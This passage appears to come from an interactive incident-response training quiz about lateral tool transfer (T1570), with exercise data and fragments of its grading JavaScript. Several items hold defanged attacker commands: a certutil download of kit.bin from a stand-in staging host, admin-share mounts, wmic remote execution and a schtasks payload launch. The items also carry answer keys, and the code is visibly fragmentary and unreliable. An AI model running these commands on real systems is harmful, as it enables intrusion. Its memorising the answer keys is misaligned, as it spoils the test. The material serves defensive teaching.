qfs-eng-ws-21.","Anchors from the artefacts: credential access on qfs-eng-ws-21 at 02:38; the 445/TCP sweep of the fab VLAN at 02:44; the first net use mount at 02:52; the EID 11 write of kit.bin seconds later; the hash comparison against the staged copy at 02:53."],"artefacts":[{"label":"Loop artefacts — per target host","code":"02:38:XX EID1 credential access on qfs-eng-ws-21 (fab-svc)\n02:44:XX EID3 sweep of fab VLAN :445\n02:52:XX EID1 net use \\\\qfs-fab-ctrl-4\\C$ /user:QFS\\fab-svc\n02:52:XX EID11 \\\\qfs-fab-ctrl-4\\C$\\Windows\\Temp\\kit.bin\n02:53:XX EID1 hash check: staged copy vs remote copy — match"}]},"question":"Order the operator's per-host steps from first to last.","answer":{"mode":"timeline","items":["Harvest the fab-svc credentials on qfs-eng-ws-21","Sweep the fab VLAN for reachable SMB endpoints","Mount \\\\qfs-fab-ctrl-4\\C$ with net use using fab-svc","Copy kit.bin from the local staging path to the admin share","Compare the remote copy's hash with the staged SHA-256"]},"hint":"Credentials before reach, reach before mount, mount before copy, copy before proof.","explanation":["The anchors force the order: without fab-svc the net use fails, without a mount the copy has no destination, and without the copy there is nothing to hash-compare.","The final hash check is operator opsec: confirming the remote bytes match the staged digest is quality control for the worm loop — and for you it is the identical-hash staging signal that makes T1570 analytics cheap."],"study":"Map each step to the artefact that timestamped it; anchors beat memory when ordering incidents."},{"id":"e06","type":"match","scenario":{"text":["The detection engineering review ties each observed or ruled-out transfer mechanism in QF-8812 to the artefact that proves it. Five mechanisms are on the board. Match them before the review closes."],"artefacts":[{"label":"Mechanism board — review state","text":"Observed with artefacts: SMB admin-share copy, certutil over HTTP. Ruled possible, artefact pending: TFTP, WebDAV path, RPC service push. The review signs off only when every row has its proving artefact."}]},"question":"Match each transfer mechanism to its proving artefact.","answer":{"pairs":[{"left":"SMB admin-share copy (net use + copy)","right":"EID 3 session to port 445 joined with an EID 11 write under \\\\host\\C$"},{"left":"certutil pull over HTTP","right":"EID 1 command line carrying -urlcache and a peer URL"},{"left":"TFTP fetch","right":"UDP port 69 flow with no file-writing tool in EID 1"},{"left":"WebDAV path \\\\host@80\\share","right":"UNC path with an @80 port escape plus traffic on 80 and 445"},{"left":"RPC service push","right":"port 135 plus ephemeral service-control flows referencing a remote binary path"}]},"hint":"Each mechanism leaves a protocol-shaped mark: the port family and the event type must agree.","explanation":["SMB copies are visible only when the file-create event joins the session that carried the bytes; either half alone is explainable away.","certutil is proven from the command line itself, while TFTP is the opposite case — the transfer tool never appears in EID 1, so the UDP 69 flow is the only mark. WebDAV betrays itself in the UNC path syntax, and RPC pushes show the service-control traffic pattern."],"study":"For each transfer protocol, know the one artefact that survives even without a matching process event."},{"id":"e07","type":"fillblank","scenario":{"text":["07:55. Your lead wants the ATT&CK mapping paragraph for the interim report on QF-8812. It must survive CTI review: one behaviour, one technique, no blurred directions. Fill the paragraph from the bank."],"artefacts":[{"label":"CTI reviewer note","text":"House rule: one behaviour, one technique, one artefact. Blurred directions come back with a red stamp, and overclaimed techniques cost the report its credibility."}]},"question":"Fill every blank with the correct word from the bank.","answer":{"template":"We assess the 02:52 SMB copy of kit.bin between the two fab hosts is ___, because the file moved victim-to-victim. The 02:41 pull of the same file from hxxp://stage-north[.]example is ___. An archive of fab recipes collected into \\\\qfs-fs-elite\\archive$ for later exfiltration would instead be modelled as ___.","blanks":["T1570","T1105","T1074"],"bank":["T1570","T1105","T1074","T1486","T1021.002","T1048"]},"hint":"Direction decides: internet into a victim, victim into victim, victim data parked for later.","explanation":["The copy is T1570 — victim-to-victim movement of a tool. The pull is T1105 — the bytes entered the estate from an external server.","T1074 describes collecting victim data into a staging location ahead of exfiltration; the fab recipe archive matches that, while the tool movement does not.","T1486 is ransomware impact and has not happened; T1021.002 would describe the authenticated share interaction rather than the transfer finding; T1048 covers exfiltration over a different protocol, which the artefacts do not show."],"study":"Write mapping paragraphs in the pattern behaviour-then-technique-then-artefact so reviewers can trace every claim."},{"id":"e08","type":"log-qcm","scenario":{"text":["04:30. The 03:12 mass-write alert was closed as the sanctioned SCCM push. A quiet follow-up now lands in ticket QF-8812: a single certutil execution at 03:41 on qfs-fab-ctrl-4, run by service account fab-svc, pulling from an internal address. No alert fired: one host, one file, no external traffic.","The on-call calls it routine certificate housekeeping. You have one chance to confirm or reject that before the shift report closes."]},"log":{"title":"Sysmon — qfs-fab-ctrl-4, 03:41–04:02","lines":["03:41:07 EID1 Image=C:\\Windows\\System32\\certutil.exe PID=4784 user=QFS\\fab-svc cmd=certutil -urlcache -split -f hxxp://10[.]20[.]4[.]31:8080/kit.bin kit.bin","03:41:08 EID3 PID=4784 qfs-fab-ctrl-4 -> 10[.]20[.]4[.]31:8080 TCP connect","03:41:09 EID11 TargetFilename=C:\\Users\\Public\\kit.bin write by PID 4784","03:41:11 EID3 PID=4784 qfs-fab-ctrl-4 -> qfs-fs-elite:445 TCP connect","03:41:12 EID11 TargetFilename=\\\\qfs-fs-elite\\C$\\Windows\\Temp\\kit.bin","03:41:40 WMI activity: status OK (routine)","03:44:02 EID1 svchost (WsusPool) update poll — normal","03:51:19 printer status page — normal","04:02:33 EID1 msiexec.exe /i \\\\qfs-sccm-01\\packages$\\fabui-2.1.msi (change QF-8803)"]},"question":"Which assessment best fits this evidence?","answer":{"options":["Routine cert-store maintenance by fab-svc; close the follow-up","Confirmed internet ingress (T1105); block the URL at the proxy and close","Internal peer-to-peer transfer consistent with T1570; host 10[.]20[.]4[.]31 needs the same review","Duplicate of the 03:12 SCCM push under a different account"],"correct":2},"hint":"The pull source is an internal address. Nothing in this flow ever left the fab network.","explanation":["The shape is a propagation step, not housekeeping: a service account runs certutil, pulls kit.bin from a peer victim over HTTP, and the story continues with an SMB write of kit.bin onto another host's admin share. Low volume is the disguise, not the defence.","The proxy block is the near-miss: there is no internet egress here, the source is 10[.]20[.]4[.]31, a fab peer. Blocking URLs at the boundary cannot touch this movement.","It is not the SCCM push either: the account, tool and file differ from the CcmExec baseline, and change QF-8803 books only the fabui push. Host 10[.]20[.]4[.]31 now needs the same review as qfs-fab-ctrl-4."],"perspectives":{"attacker":"One quiet pull from a peer is the cheapest worm step; small volume hides from volume-based alerts.","defender":"Alert on service-account certutil with a peer URL; treat 'only one host' as a lead, not a verdict."},"study":"Compare this certutil line with your org's benign certificate-maintenance command shapes."},{"id":"e09","type":"dragdrop","scenario":{"text":["08:10. IR lead, on the bridge: 'Plan for QF-8812 in three columns. The fab line runs until 06:00 tomorrow; anything that touches SMB on the fab VLAN costs production minutes. I want the least aggressive plan that still cuts the transfer path.'"],"artefacts":[{"label":"Constraints note","text":"Fab batch ends 06:00. Legacy historian gateways negotiate SMB1. Change control rejects unplanned VLAN work mid-batch."}]},"question":"Drag each proposed action into the column it belongs to.","answer":{"zones":[{"name":"Do now — targeted, low fab impact"},{"name":"Needs fab sign-off — costly"},{"name":"Not useful against T1570"}],"items":[{"text":"Alert on the canary share \\\\qfs-fs-elite\\canary$","zone":0},{"text":"Restrict admin-share write rights for account fab-svc only","zone":0},{"text":"Block unsigned executables in C$\\Windows\\Temp via execution prevention (M1038)","zone":0},{"text":"Disable SMB on the fab VLAN until the next shutdown window","zone":1},{"text":"Quarantine qfs-fab-ctrl-4 mid-batch for a full re-image","zone":1},{"text":"Rotate j.mbeki's mailbox password","zone":2},{"text":"Block the stage-north[.]example URL at the egress proxy","zone":2}]},"hint":"Two actions cost fab minutes; two fix nothing about tool movement.","explanation":["The do-now column attacks exactly the path seen in the logs: a canary share gives early warning, account-scoped share-write restriction removes the identity the worm used, and execution prevention on the Temp staging path stops a transferred binary from ever running.","VLAN-wide SMB disable and a mid-batch re-image of qfs-fab-ctrl-4 would work technically, but both stop production — the costly column, where fab sign-off is mandatory.","Rotating j.mbeki's mailbox password and blocking stage-north[.]example at the proxy are good hygiene but touch no victim-to-victim movement; they sit outside T1570."],"perspectives":{"attacker":"Every hour the share-write path survives is another hour of propagation.","defender":"Cut the identity and the staging path first; spend fab minutes only when targeted actions fail."},"study":"Practise ranking response options by production cost before by technical completeness."},{"id":"e10","type":"qcm-single","scenario":{"text":["08:40. The staging analytic fires again: a first-seen utility hash, written to 12 admin shares in nine minutes. Change record QF-8803 confirms an active SCCM rollout window on the same VLAN, and the platform lead insists 'that's my push'.","But the EID 11 writers on the 12 hosts are not CcmExec: the sessions originate from qfs-eng-ws-21 under account fab-svc, and EID 1 shows wmic /node: process calls from the same foothold."],"artefacts":[{"label":"Writer sample — one of the 12 hosts","code":"09:14:02 EID3 qfs-eng-ws-21 -> qfs-eng-ws-30:445 account=QFS\\fab-svc\n09:14:03 EID11 \\\\qfs-eng-ws-30\\C$\\Windows\\Temp\\svcutil.exe hash=first-seen 8d21…\n09:14:31 EID1 wmic.exe /node:qfs-eng-ws-30 process call create svcutil.exe"}]},"question":"Which signal decides the call, and why?","answer":{"options":["The change window wins: identical hashes across many hosts are normal for one package","The host count wins: any 12-host identical-hash burst is an incident by itself","The writer identity wins: the sessions do not come from the SCCM server, so treat as staging until disproved","Neither wins: the signals cancel out; log it and wait for more alerts"],"correct":2},"hint":"A change window authorises the SCCM server's writes. It says nothing about who else may write.","explanation":["The change record authorises one writer — CcmExec on qfs-sccm-01. When the actual writers are fab-svc sessions from a workstation, the change window is irrelevant to those events; identity evidence outranks paperwork.","Host count is the alarmist near-miss: volume alone also fires for legitimate rollouts. It escalates attention; it does not decide classification.","Waiting for more alerts is the weakest option: you already hold the deciding fields. The call is provisional — treat as staging, then attempt disproof (process ancestry, account ownership) rather than dismissal."],"study":"Practise arguing conflicting signals in writing: name the deciding field and say why the losing signal loses."},{"id":"e11","type":"match","scenario":{"text":["Before the 09:00 standup the IR lead needs the evidence map for QF-8812: for each open question, the artefact that answers it. Five questions are on the board; five artefacts wait beside them."],"artefacts":[{"label":"Evidence board — 08:52","text":"Questions pinned: scope, identity, execution, direction, sanction. Artefact cards wait on the side rail. Every question must pair with exactly one card, or the finding cannot be written."}]},"question":"Match each investigation question to the artefact that answers it.","answer":{"pairs":[{"left":"Did the same tool land on many hosts?","right":"hash inventory across all EID 11 file-create events"},{"left":"Which account moved the file?","right":"EID 3 session fields: account, source host, destination"},{"left":"Did the copied tool execute on the target?","right":"EID 1 process-create within minutes of the EID 11 write"},{"left":"Was the source a peer or the internet?","right":"resolution of the URL host against internal address space"},{"left":"Is the write a sanctioned rollout?","right":"SCCM change record plus CcmExec writer identity"}]},"hint":"One question, one artefact; the answer is a field family, not a tool name.","explanation":["Each question needs the field family that can actually answer it: hashes for scope, session fields for identity, process events for execution, address space for direction, and change data plus writer identity for sanction.","Mixing these up is how reports overclaim: a hash inventory cannot prove execution, and a change record cannot prove who wrote a file."],"study":"Build the habit of naming the artefact before writing the finding."},{"id":"e12","type":"branching","scenario":{"text":["04:55, ticket QF-8812 escalated. Work the response one decision at a time."],"artefacts":[{"label":"Escalation note — QF-8812","text":"Nine C$ sessions from qfs-eng-ws-21 in four minutes; EID 11 write of kit.bin after each. Account fab-svc throughout. Fab line mid-batch. IR lead paged."},{"label":"Sysmon excerpt — qfs-fab-ctrl-4","code":"04:55:31 EID3 qfs-eng-ws-21 -> qfs-fab-ctrl-4:445 account=QFS\\fab-svc\n04:55:32 EID11 \\\\qfs-fab-ctrl-4\\C$\\Windows\\Temp\\kit.bin\n04:56:12 EID1 schtasks.exe /create /tn fabkit /tr C:\\Windows\\Temp\\kit.bin\n04:56:52 EID1 C:\\Windows\\Temp\\kit.bin (SYSTEM, task fabkit)"}]},"question":"Work the incident one decision at a time.","steps":[{"continuation":"Nine targets are already written. The IR lead wants evidence before action.","question":"What do you establish first?","options":["Reboot qfs-fab-ctrl-4 to kill any running copy of the tool","Check EID 1 on one target: did kit.bin execute after the write, and under what parent?","Delete kit.bin from all nine Temp folders","Email the fab floor asking whether anyone moved files"],"correct":1},{"continuation":"EID 1 shows schtasks.exe creating a task that ran kit.bin as SYSTEM 40 seconds after each write. Account fab-svc is still active.","question":"Which containment preserves fab uptime and cuts the transfer path?","options":["Disable fab-svc, remove its admin-share write rights, and isolate qfs-eng-ws-21 from the fab VLAN","Disable SMB across the fab VLAN for the rest of the batch","Power off the fab control network until morning","Delete the scheduled tasks only and keep fab-svc enabled"],"correct":0},{"continuation":"Containment is in. The IR lead asks what detection to add so this cannot walk again tonight.","question":"Which detection change is the least aggressive that still closes the gap?","options":["Org-wide SMB signing enforcement, effective immediately","A canary admin share plus an analytic for first-seen hashes written to C$ paths","Disable all file shares on qfs-fs-elite","Raise antivirus scan frequency to hourly"],"correct":1}],"hint":"Execution first, identity second, network last — the cheapest step that works is the answer.","explanation":["Step one is evidence before action: the EID 1 check tells you whether the transferred tool executes and how it was launched, which shapes every later decision. Reboots and mass deletion destroy exactly that.","Step two cuts identities, not the network: disabling fab-svc and isolating the single foothold stops the loop while the fab line keeps running. VLAN-wide measures belong in the sign-off column.","Step three is the durable fix: a canary share plus first-seen-hash-on-C$ analytics is cheap, targeted and catches the next attempt immediately, while signing enforcement is a hardening project with legacy trade-offs — right eventually, wrong as tonight's emergency dial."],"perspectives":{"attacker":"Scheduled-task detonation means the write and the impact are separable — catching the write is your one cheap chance.","defender":"Canary shares convert the attacker's next probe into your earliest alarm."},"study":"Rehearse the escalation ladder: evidence, identity, network — in that order of cost."},{"id":"e13","type":"fillblank","scenario":{"text":["The detection engineer formalises the QF-8812 correlation rule for peer review. The spec must name exact event identifiers, the join field and the baseline exclusion, or the SIEM owner will bounce it back."],"artefacts":[{"label":"Rule draft — for review","text":"Join the share-write event with the network event inside a ten-second window; exclude the sanctioned deployment writer. Name the event IDs, the join field and the excluded identity exactly."}]},"question":"Fill every blank with the correct word from the bank.","answer":{"template":"Join Sysmon event ID ___ (file create) with event ID ___ (network connection) on the writing session's ___ within a ten-second window, and baseline writes performed by the ___ service account so sanctioned deployments do not page.","blanks":["11","3","SourceIp","CcmExec"],"bank":["11","3","7","SourceIp","DestinationHostname","CcmExec","MsMpEng","winlogon"]},"hint":"The join key is the address that owned the session; two event numbers and one service process finish the sentence.","explanation":["EID 11 carries the TargetFilename and hash of the share write; EID 3 carries the session, including the SourceIp of the writer. Joining them on the session address inside a tight window is what makes the pair a transfer rather than a coincidence.","CcmExec is the SCCM client identity whose writes you expect; baselining it keeps the analytic quiet during sanctioned rollouts.","Event ID 7 is image-load — plausible but it carries no share path; DestinationHostname would anchor the wrong end of the session for a writer-side join; MsMpEng and winlogon are unrelated processes."],"study":"Write one correlation rule end-to-end in your own SIEM language, including its exclusion list."},{"id":"e14","type":"terminal","scenario":{"text":["10:05. Engineering asks for a re-run of the exact 02:52 transfer on the isolated lab VM — a rehost of qfs-eng-ws-21 with no fab connectivity — to validate the new EID 11 plus EID 3 analytic before it ships.","Reproduce the transfer as it appears in ticket QF-8812: fetch kit.bin from the staging host and drop it into the current directory as kit.bin. The URL is logged defanged; keep it defanged. Nothing is executed for real."],"artefacts":[{"label":"Ticket QF-8812 excerpt — the 02:52 transfer","text":"Source host: stage-north[.]example (logged defanged, hxxp://). Payload: kit.bin, 1462208 bytes. Destination: current directory of the lab VM, file name unchanged."}]},"question":"Type the transfer command, then press Check.","answer":{"shellTitle":"analyst@labvm-07 — simulated Windows cmd","prompt":"C:\\lab>","shellIntro":["Simulated shell. Type the command and press Enter. Nothing is executed for real.","Type the URL defanged, exactly as it appears in the ticket."],"elements":[{"desc":"invokes certutil, the signed Windows utility being abused","pattern":"\\bcertutil\\b"},{"desc":"uses the URL-cache download mode","pattern":"\\s-urlcache\\b"},{"desc":"forces the fetch into a discrete file (-split) with forced overwrite (-f)","pattern":"\\s-split\\s+-f\\b"},{"desc":"names the defanged staging URL host stage-north[.]example as the source","pattern":"stage-north\\[\\.\\]example"},{"desc":"writes the payload as kit.bin, the name seen in the share-write events","pattern":"\\bkit\\.bin\\b"}],"wrongPatterns":[{"desc":"del kit.bin deletes the artefact instead of reproducing the transfer","pattern":"(^|\\s)del\\s+kit\\.bin\\b"},{"desc":"certutil -pulse triggers certificate auto-enrollment — a different certutil job entirely","pattern":"\\bcertutil\\b[^|;&]*\\s-pulse\\b"}],"canonical":"certutil -urlcache -split -f hxxp://stage-north[.]example/kit.bin kit.bin","canonicalParts":["certutil — signed Microsoft utility abused for downloads (LOLBAS)","-urlcache — download from the URL into the URL cache","-split -f — save the response as a discrete file and force the fetch","hxxp://stage-north[.]example/kit.bin — defanged source URL of the staging host","kit.bin — output file name as seen in the EID 11 events"],"expectedOutput":["****  Online  ****","  0000  ...  kit.bin written (1462208 bytes)","CertUtil: -URLCache command completed successfully."]},"hint":"One signed tool, one cache mode, two fetch switches, one defanged source, one destination name.","explanation":["The canonical command is `certutil -urlcache -split -f hxxp://stage-north[.]example/kit.bin kit.bin`. Each element is graded separately: the tool, the cache mode, the two fetch switches, the defanged staging host and the output name.","The near-misses are destructive or off-target: `del kit.bin` removes the artefact you were asked to reproduce, and `certutil -pulse` triggers certificate auto-enrollment — a completely different certutil job that would pollute the validation run.","Keeping the URL defanged (stage-north[.]example, hxxp://) is a reporting habit: logs, tickets and reports should never carry live-looking indicators."],"study":"Run certutil -urlcache -help on a lab VM and read each flag's meaning once."},{"id":"e15","type":"log-qcm","scenario":{"text":["11:15. Final correlation review for QF-8812. The chain so far: ingress at 02:41 on qfs-eng-ws-21, transfer to qfs-fab-ctrl-4 at 02:52 — and then a forwarder gap on the target. Execution on the target is still an open question.","The review closes only if the execution proof is named precisely."]},"log":{"title":"Sysmon chain — qfs-eng-ws-21 / qfs-fab-ctrl-4, 02:41–04:02","lines":["02:41:11 EID1 certutil.exe PID=6210 qfs-eng-ws-21 cmd=certutil -urlcache -split -f hxxp://stage-north[.]example/kit.bin kit.bin","02:41:12 EID3 PID=6210 qfs-eng-ws-21 -> 203[.]0[.]113[.]44:443","02:41:13 EID11 C:\\Users\\Public\\kit.bin written by PID 6210","02:52:30 EID1 net.exe use \\\\qfs-fab-ctrl-4\\C$ /user:QFS\\fab-svc (qfs-eng-ws-21)","02:52:31 EID3 qfs-eng-ws-21 -> qfs-fab-ctrl-4:445 account=QFS\\fab-svc","02:52:32 EID11 \\\\qfs-fab-ctrl-4\\C$\\Windows\\Temp\\kit.bin","02:57:41 — qfs-fab-ctrl-4 forwarder restart: events missing until 03:04:12 —","03:04:13 EID1 wuauclt.exe update poll (normal)","03:06:40 EID1 schtasks.exe /create /tn fabkit /tr C:\\Windows\\Temp\\kit.bin (qfs-fab-ctrl-4)","03:41:07 EID1 certutil.exe PID=4784 qfs-fab-ctrl-4 cmd=certutil -urlcache -split -f hxxp://10[.]20[.]4[.]31:8080/kit.bin kit.bin","03:41:12 EID11 \\\\qfs-fs-elite\\C$\\Windows\\Temp\\kit.bin","04:02:33 EID1 msiexec.exe /i \\\\qfs-sccm-01\\packages$\\fabui-2.1.msi (change QF-8803)"]},"question":"Which line proves the transferred tool executed on qfs-fab-ctrl-4 despite the forwarder gap?","answer":{"options":["02:52:32 EID11 \\\\qfs-fab-ctrl-4\\C$\\Windows\\Temp\\kit.bin","03:06:40 EID1 schtasks.exe /create /tn fabkit /tr C:\\Windows\\Temp\\kit.bin","03:04:13 EID1 wuauclt.exe update poll","04:02:33 EID1 msiexec.exe /i \\\\qfs-sccm-01\\packages$\\fabui-2.1.msi (change QF-8803)"],"correct":1},"hint":"The gap eats the minutes around the write. Look for the file's name inside a process command line afterwards.","explanation":["The schtasks line references the exact staged path in a command that schedules it — operator-driven execution, and it falls after the forwarder restart, so the gap cannot touch it.","The EID 11 write proves transfer, not execution — the near-miss. wuauclt and the msiexec line are baselined noise: one is the update client, the other is change QF-8803.","The gap annotation also matters for scope: events between 02:57:41 and 03:04:12 are unknown, so the report claims minimum scope, never completeness."],"perspectives":{"attacker":"Gaps in telemetry are free time; the operator never knows which minutes you lost.","defender":"Annotate gaps explicitly — unknown is not benign, and scope claims must respect it."},"study":"Read forwarder-restart gaps as a scope boundary, and hunt execution evidence after the gap, not inside it."}]};

/* ---------- timer state machine ----------

function setState(s){
  var prev=timer.state;
  if((prev===STATE_MAN||prev===STATE_AUTO)&&s!==prev){
    var spent=Math.round((Date.now()-pauseEnteredAt)/1000);
    if(prev===STATE_MAN)timer.manualSec+=spent;else timer.autoSec+=spent;

  if(s===STATE_MAN||s===STATE_AUTO)pauseEnteredAt=Date.now();
  timer.state=s;
  if(s!==STATE_RUN&&prev===STATE_RUN&&tickHandle){clearInterval(tickHandle);tickHandle=null;}
  if(s===STATE_RUN&&!tickHandle){tickHandle=setInterval(tick,1000);}

}

  if(timer.state===STATE_MAN)timer.manualSec++;

function prepareExercise(ex){

    if(ex.type==='log-qcm'&&typeof a.correct==='number')a.correct=[a.correct];

    var order=shuffle(a.options.map(function(_,i){return i;}));

    if(!multi){var c0=Array.isArray(a.correct)?a.correct[0]:a.correct;a._corr=order.indexOf(c0);a._multi=false;}
    else{a._corr=a.correct.map(function(c){return order.indexOf(c);});a._multi=true;}
  }
  if(ex.type==='dragdrop'){ex.answer._bank=shuffle(ex.answer.items.map(function(_,i){return i;}));ex.answer._placed={};}
  if(ex.type==='order'){ex.answer._disp=shuffle(ex.answer.items.map(function(_,i){return i;}));}
  if(ex.type==='match'){ex.answer._right=shuffle(ex.answer.pairs.map(function(_,i){return i;}));ex.answer._pairs=[];ex.answer._selLeft=null;}
  if(ex.type==='fillblank'){
    var fa=ex.answer;
    var distr=(fa.bank||[]).filter(function(w){return fa.blanks.indexOf(w)<0;});
    var words=fa.blanks.map(function(w,i){return {t:w,slot:i};}).concat(distr.map(function(w){return {t:w,slot:-1};}));
    fa._words=shuffle(words);
    fa._bank=fa._words.map(function(_,i){return i;});
    fa._filled=fa.blanks.map(function(){return null;});
    fa._selChip=null;
  }
  if(ex.type==='branching'){
    ex._step=0;
    ex.steps.forEach(function(st){
      var order=shuffle(st.options.map(function(_,i){return i;}));
      st._disp=st.options.map(function(o,i){return {text:st.options[order[i]],orig:order[i]};});
      st._corr=order.indexOf(st.correct);
      st._choice=null;
      st._done=false;
    });

}

function scoreExercise(H,W,N){N=Math.max(1,N);return Math.max(0,(H-W)/N);}
function gradeExercise(ex){

      });
      r={H:H2,W:W2,N:corr.length,items:items2,multi:true};
    }
  }else if(ex.type==='dragdrop'){
    var H3=0,W3=0,items3=[];
    a.items.forEach(function(it,i){
      var z=a._placed[i];
      if(z===undefined||z===null){items3.push({status:'missed',text:it.text+' → correct zone: '+a.zones[it.zone].name});}
      else if(z===it.zone){H3++;items3.push({status:'correct',text:it.text+' → '+a.zones[it.zone].name});}
      else{W3++;items3.push({status:'wrong',text:it.text+' → placed in "'+a.zones[z].name+'", correct zone: "'+a.zones[it.zone].name+'"'});}

  }else if(ex.type==='order'){

    for(var k=0;k<a._disp.length;k++){
      var ok=(a._disp[k]===k);
      if(ok)H4++;else W4++;
      items4.push({status:ok?'correct':'wrong',text:'Position '+(k+1)+': expected "'+a.items[k]+'", you placed "'+a.items[a._disp[k]]+'"'});

    });
    r={H:H5,W:W5,N:a.pairs.length,items:items5};
  }else if(ex.type==='fillblank'){
    var H6=0,W6=0,items6=[];
    a.blanks.forEach(function(b,i){
      var f=a._filled[i];
      if(f===null){items6.push({status:'missed',text:'Blank '+(i+1)+': correct word "'+b+'"'})}
      else{
        var w=a._words[f];
        if(w.slot===i){H6++;items6.push({status:'correct',text:'Blank '+(i+1)+': "'+b+'"'});}
        else{W6++;items6.push({status:'wrong',text:'Blank '+(i+1)+': you used "'+w.t+'", correct word: "'+b+'"'});}
      }
    });
    r={H:H6,W:W6,N:a.blanks.length,items:items6};
  }else if(ex.type==='terminal'){
    var norm=normalizeCmd(ex._cmd);
    var H7=0,W7=0,items7=[],danger=false;
    a.elements.forEach(function(el){
      var ok=new RegExp(el.pattern,'i').test(norm);
      if(ok){H7++;items7.push({status:'correct',text:el.desc});}
      else{items7.push({status:'missed',text:el.desc});}
    });
    (a.wrongPatterns||[]).forEach(function(wp){
      if(new RegExp(wp.pattern,'i').test(norm)){W7++;danger=true;items7.push({status:'wrong',text:wp.desc});}
    });
    if(!norm){W7++;items7.push({status:'wrong',text:'No command was entered.'});}
    r={H:H7,W:W7,N:a.elements.length,items:items7,terminal:true,danger:danger};
  }else if(ex.type==='branching'){
    var H8=0,W8=0,items8=[];
    ex.steps.forEach(function(st,i){
      var ok=(st._choice===st._corr);
      if(ok)H8++;else W8++;
      items8.push({status:ok?'correct':'wrong',text:'Step '+(i+1)+' — '+st.options[st.correct]});
    });
    r={H:H8,W:W8,N:ex.steps.length,items:items8,branching:true};
  }else{r={H:0,W:0,N:1,items:[]};}
  var credit=scoreExercise(r.H,r.W,r.N);
  if(hintUsed[ex.id])credit=Math.max(0,credit-0.10);
  r.credit=credit;
  return r;
}
function normalizeCmd(c){
  return String(c||'').toLowerCase().replace(/\s+/g,' ').trim().replace(/;$/,'').replace(/\/$/,'');
}

function scenarioBlock(ex){
  var sc=ex.scenario||{};

  (sc.artefacts||[]).forEach(function(art,i){

function questionBlock(ex){

  }

function feedbackBlock(ex,res){
  var label,color,icon,headColor;
  var fullRaw=(res.W===0&&res.H>=res.N);
  if(res.terminal&&res.danger&&res.credit<1){
    label='DANGEROUS — NEAR MISS';color='st-incorrect';icon='&#10007;';headColor='var(--state-incorrect)';
  }
  else if(res.credit>=1){label='CORRECT';color='st-correct';icon='&#10004;';headColor='var(--state-correct)';}
  else if(res.single&&fullRaw){label='CORRECT';color='st-correct';icon='&#10004;';headColor='var(--state-correct)';}
  else if(res.credit>0){label='PARTIALLY CORRECT';color='st-partial';icon='&#10004;';headColor='var(--state-partial)';}
  else{label='INCORRECT';color='st-incorrect';icon='&#10007;';headColor='var(--state-incorrect)';}
  var h='<div class="block-h"><span class="ic">'+icon+'</span><span class="fb-title" style="color:'+headColor+'">'+label+'</span>';
  if(res.N>1||!res.single||hintUsed[ex.id])h+='<span class="fb-credit">credit '+res.credit.toFixed(2)+' — '+res.H+'/'+res.N+' items'+(res.W>0?' · '+res.W+' wrong':'')+(hintUsed[ex.id]?' · hint −0.10':'')+'</span>';
  h+='</div>';
  var b='<div class="block-b">';
  if(res.terminal&&res.danger)b+='<p style="color:var(--state-incorrect);font-weight:700">&#9888; Your command was close — and destructive. Read the warning below before running anything similar on a real host.</p>';
  b+='<div class="item-rows">';
  res.items.forEach(function(it){
    var mk=it.status==='correct'?'<span class="mk mk-c">&#10004; Correct</span>':it.status==='wrong'?'<span class="mk mk-w">&#10007; Wrong</span>':'<span class="mk mk-m">&#9675; Missed</span>';
    b+='<div class="item-row">'+mk+'<span>'+md(it.text)+'</span></div>';
  });
  b+='</div>';
  (ex.explanation||[]).forEach(function(p){b+='<p>'+md(p)+'</p>';});
  if(ex.perspectives&&(ex.perspectives.attacker||ex.perspectives.defender)){
    b+='<div class="persp">';
    if(ex.perspectives.attacker)b+='<div class="p-card red"><h6>&#9876; Attacker perspective</h6>'+md(ex.perspectives.attacker)+'</div>';
    if(ex.perspectives.defender)b+='<div class="p-card blue"><h6>&#128737; Defender perspective</h6>'+md(ex.perspectives.defender)+'</div>';
    b+='</div>';
  }
  if(res.terminal&&ex.answer.canonical){
    b+='<div class="canon"><h6>Canonical command (copyable)</h6><pre id="canon-cmd">'+esc(ex.answer.canonical)+'</pre>';
    if(ex.answer.canonicalParts&&ex.answer.canonicalParts.length){b+='<ul>';ex.answer.canonicalParts.forEach(function(p){b+='<li>'+md(p)+'</li>';});b+='</ul>';}
    if(ex.answer.expectedOutput)b+='<h6 style="margin-top:10px;color:var(--text-secondary)">Expected output shape</h6><pre>'+esc(ex.answer.expectedOutput)+'</pre>';
    b+='</div>';
  }
  if(res.credit<1&&ex.study)b+='<div class="study-tip">&#128161; <b>What to study:</b> '+md(ex.study)+'</div>';
  b+='</div>';
  return '<section class="block bl-feedback" aria-label="Feedback" aria-live="polite">'+h+b+'</section>';
}

      if(a.syntaxPanel.example)h+='<div style="margin-top:8px" class="small muted">Example on a different target: <span class="log-line" style="color:var(--text-mono)">'+hl(a.syntaxPanel.example)+'</span></div>';
      h+='</div>';
    }
    return ansBox(ex,h);
  },
  bind:function(ex,root){
    var a=ex.answer,sc=$('tsc-'+ex.id),inp=$('tin-'+ex.id);
    function line(txt,cls){
      var d=document.createElement('div');d.className='term-line '+(cls||'');d.innerHTML=hl(txt);sc.appendChild(d);sc.scrollTop=sc.scrollHeight;
    }
    (a.shellIntro||[]).forEach(function(l){line(l);});
    inp.addEventListener('keydown',function(ev){
      if(ev.key==='Enter'){
        var c=inp.value;inp.value='';ex._cmd=c;
        line((a.prompt||'analyst@lab:~$')+' '+c,'');
        if(!c.trim())return;
        (a.expectedOutput&&a.expectedOutput.length?a.expectedOutput:['(simulated) command accepted — output suppressed until you press Check.']).forEach(function(l){line(l);});
      }
    });
    if(a.perExerciseTimeLimit){timer.perLimit=a.perExerciseTimeLimit;timer.perRemain=a.perExerciseTimeLimit;}
    else{timer.perLimit=0;timer.perRemain=0;}
  },
  lock:function(ex,root){var i=$('tin-'+ex.id);if(i)i.disabled=true;timer.perLimit=0;}
};
function perExExpired(){
  var ex=exam.list[exam.current];
  if(!ex||ex.result)return;
  var inp=$('tin-'+ex.id);if(inp)inp.disabled=true;

}

WIDGETS['branching']={
  render:function(ex){
    return ansBox(ex,'<div id="br-'+ex.id+'"></div>');
  },
  bind:function(ex,root){
    renderBranchStep(ex,root);
  },
  lock:function(ex,root){root.querySelectorAll('#br-'+ex.id+' button, #br-'+ex.id+' .opt').forEach(function(b){b.disabled=true;});}
};
function renderBranchStep(ex,root){
  var a=ex.steps[ex._step];
  var holder=$('br-'+ex.id);
  var h='';
  h+='<div class="opts">';
  a._disp.forEach(function(o,i){
